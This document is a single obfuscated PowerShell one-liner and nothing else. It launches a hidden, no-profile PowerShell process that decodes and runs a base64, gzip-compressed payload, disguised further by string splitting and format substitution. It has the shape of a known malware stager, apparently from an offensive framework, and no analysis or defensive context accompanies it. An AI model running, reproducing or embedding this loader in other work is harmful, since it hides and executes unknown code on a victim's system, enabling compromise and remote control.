if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIAI6tTWQCA7VX/2+iyhb//Sb3fyA3JmJqBVvr2k02eYOC4KorRcEv17xQGGHqCCwMVbzv/u/vDOq2zXZv9r1kJ01kZs''+''7Xzz{1}nzukmjzxG4kjIv9w6w{1}+//yac18RN3Z0gVmJ9VBcqB7X2c{1}VhNzgRPgniCiVJL965JFp//NjN0xRH7LRv9DFDWYZ3j5TgTKwJ/xGcEKf4+svjE/aY8JdQ+XejT+NH{1}57Jiq7rhVi4RpHP74ax53K7G{1}ZCCROrf/5Zra2um+uG+jV3aSZWrSJjeNfwKa3WhL9rXOG0SLBYHREvjbN4wxoOiW5vGrMoczd4DNKe8Q''+''izMPazKjjz4k6KWZ5GJ6+4mBORWIXPSRp7yPdTnGXVurDiC{1}br9b/E1Vn7Qx4xssMNI2I4jRMLp8/Ew1{1}DdyOf4ge8WQOXxVISBetaDcie4y0W''+''K1FOaV34X8SIY7y/YPezTOJrJqCasLRWh4i+4+co9nOKT5zVdwz{1}WVCDdcoEQO9vDuDmkjvJ9J3MeTm4rFV5g8FccRJnpGT9JMh1YQSKXRanBWwr0zTHtfU3sIXKM33Ybus/K6554QXOpxYcrOyY+OsX9jexrxyW95zmx4ncwxsS4V4RuTviXXJVfC8eeENxiUfjQjYG88Tq+QL7PUxx4''+''DKOME+L79jUHWHfeJWcUB+nyIOYZmAVhLv21phT0MSqEY3''+''wDsA77SFPKxuoEHyhP{1}dFcdHO90BU7VI3y+rCJIcS''+''9eqChV2K/bqAooycr1DO4vKz+mLuKKeMeG7GLuLWtbdonrV24yhjae5BVAGBqZVgj7iUA1IXdOJjpbBIcNFef''+''ReOrkspFA5IeoZwwAmHwWI8V1Iw9JQXtYaFmbFLKN4BUf{1}kaNQN''+''4IE410eZXW6A/er7h{1}6q4JTyHJgLIq/MhGhbNGZ1wSYpg/eHg/zU+v9s+P7h4cZ0U3yOjXgpr5VSMF4B{1}cLmKXoGqIQjZQCF{1}sY7xc1wu3V6YcQ/JJX07ia9+IhgqdqDa''+''SvWzF''+''4aI39ALYNZC5UMZ2FokKYRWOjq1tomBrkdmNOpPrB6Okp7h3CDjMxQdaUwmwrydPLBHpT0RDY6FtLNZay1+ijrmrY6CecGKOoOAyOAX8UIPUVeyoEiq9bQ7HaH{1}hKa{1}qmbrebSkDp0PPKoQo6WAXIcrs/09EHPPYAetdXS54cpGo8GKNS++FrzRgtVIqMt519u+8OeWu49vjcXmUpUrkdbmHaIHTtRHFVbm''+''nZiBFf7wLSHUksLFTg3yGGYWBKsZnPwHPnHEe0cR2CuaS8HBC+NABcBMhGyFhG1HvddpN7tnfHC7c60GZxtp0Z0MB+TkV8sdOneHhGcxMhUEdIo{1}OgOufue1HTiz6Z9Z85U+VDM5''+''MNefZL2Khnst+ffWb/dDqRNayLZ{1}hHpbqiAvcWgtSWDK7jbuba82Eg2x6+7jaRjNKdtpaNwTMEfE3gIj5EbPADfiQexyJhLkh1IAeq17hgPuWVMVENrD+5j/aaD5nkhF+MoQFzOVxPwcRH3VC{1}{1}dLYB2NpvO58fpncbbtfNApIG/naD2+bYOfmyG3SA9mb7Vmepx5i0kC7HgPvccUoIAdPwK9ISJQ+y594RcLH9JWDXfNw2Q8BuIHU+JMYEYgE5speD5BA5R8D4at6kijPTnLbCvVAe3ViyIyPMj326t1nh35GjMwd792Db1ef0aq/PP0D+PJqm4SGOb9wj''+''vb3hadv+Zw38C0NzYS6CGZp8QD4eQ/4/X+1VtavDHQ{1}NZC4Ws77aNzgtKmnjma''+''qqe3UWSfvZk1TM549zWZfumtwfOjh0h''+''nvmDhzpfvbpDyjP1YxE7PZmXaH37SVvYb//VsnVV0X6o948ctMsdCkULzTdy''+''wuqxa{''+''1}27qSTmHAOUSynsS1OI0xhhIEh5/LyIEpj''+''j7dx6LkwQJzaOp8yZkZp0ntfNeEbYe2{1}uV''+''+OPn5cgo3w{1}hV2Y4ijgIV1+XAry9CX5YPcK{1}+sn/erGyeFCKLqvK8''+''DKCe5tJ''+''QLoshGEMVfjxLMb''+''Qy6yI9w+hFkoHkLTz70oNNDzIFT4pi+hq306VsCvGAGYDXB5RWf1sq8AO5r/BXGSj7PvJ6PKji22782Wc7dJIQf/5+T5eXsH25/KoHkOofmu8O3B6968C9033EJA''+''0oLmiLFpyntPRTO1fEqtjwykP2b8+L/tnzJ2fUYxuCyKf8Xsg3oxy4NAAA{0}'')-f''='',''l'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);